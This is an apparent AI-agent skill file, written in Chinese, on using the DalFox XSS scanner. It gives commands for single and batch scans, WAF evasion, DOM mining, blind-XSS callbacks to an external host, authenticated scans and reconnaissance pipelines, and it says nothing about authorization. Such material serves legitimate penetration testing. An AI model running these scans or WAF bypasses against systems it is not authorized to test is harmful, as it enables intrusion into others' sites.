---
name: dalfox-xss
description: "使用 DalFox 进行 XSS 漏洞扫描。当需要检测反射型/存储型/DOM XSS、分析参数注入点、绕过 WAF 时使用。DalFox 支持自动参数分析、DOM 挖掘、Blind XSS 回调、WAF 绕过、自动生成 PoC。任何涉及 XSS 漏洞检测、参数测试、WAF 绕过的场景都应使用此技能"
metadata:
  tags: "dalfox,xss,scan,XSS扫描,反射型,存储型,DOM,WAF绕过,Blind XSS,参数分析,PoC"
  category: "tool"
---

# DalFox XSS 漏洞扫描方法论

DalFox 是专业的 XSS 漏洞扫描器。核心优势：**智能参数分析**（自动识别可注入参数）+ **DOM 挖掘** + **WAF 绕过** + **Blind XSS 支持**。

项目地址：https://github.com/hahwul/dalfox

## Phase 1: 基本扫描

```bash
# 扫描单个 URL（含参数）
dalfox url "http://target.com/search?q=test"

# 从文件批量扫描
dalfox file urls.txt

# 从 stdin 管道
cat urls.txt | dalfox pipe

# 静默输出（只显示发现）
dalfox url "http://target.com/search?q=test" --silence
```

## Phase 2: 高级扫描

```bash
# Blind XSS（指定回调地址）
dalfox url "http://target.com/form?input=test" \
  --blind "https://your-callback.xss.ht"

# 启用 WAF 绕过
dalfox url "http://target.com/search?q=test" --waf-evasion

# 启用 DOM 分析
dalfox url "http://target.com/page" --mining-dom

# 自定义 Payload 文件
dalfox url "http://target.com/search?q=test" \
  --custom-payload payloads.txt

# POST 请求
dalfox url "http://target.com/submit" \
  --data "name=test&comment=hello" --method POST
```

## Phase 3: 认证和自定义

```bash
# 带 Cookie
dalfox url "http://target.com/search?q=test" \
  --cookie "session=abc123"

# 自定义 Header
dalfox url "http://target.com/search?q=test" \
  --header "Authorization: Bearer token"

# 使用代理
dalfox url "http://target.com/search?q=test" \
  --proxy http://127.0.0.1:8080

# 控制并发和延迟
dalfox url "http://target.com/search?q=test" \
  --worker 10 --delay 100
```

## Phase 4: 管道集成

```bash
# 爬虫 → XSS 扫描
katana -u http://target.com -jc -silent | dalfox pipe --silence

# 参数发现 → XSS 扫描
cat urls.txt | gau | grep "=" | dalfox pipe --silence

# URL 收集 → 去重 → XSS 扫描
gau target.com | grep "=" | sort -u | dalfox pipe --silence

# JSON 输出
dalfox url "http://target.com/search?q=test" --format json -o results.json
```

## 常用场景速查

| 场景 | 命令 |
|------|------|
| 单 URL 快扫 | `dalfox url "http://target/search?q=test"` |
| 批量扫描 | `dalfox file urls.txt --silence` |
| Blind XSS | `dalfox url "URL" --blind "https://callback.xss.ht"` |
| WAF 绕过 | `dalfox url "URL" --waf-evasion` |
| 管道扫描 | `cat urls.txt \| dalfox pipe --silence` |
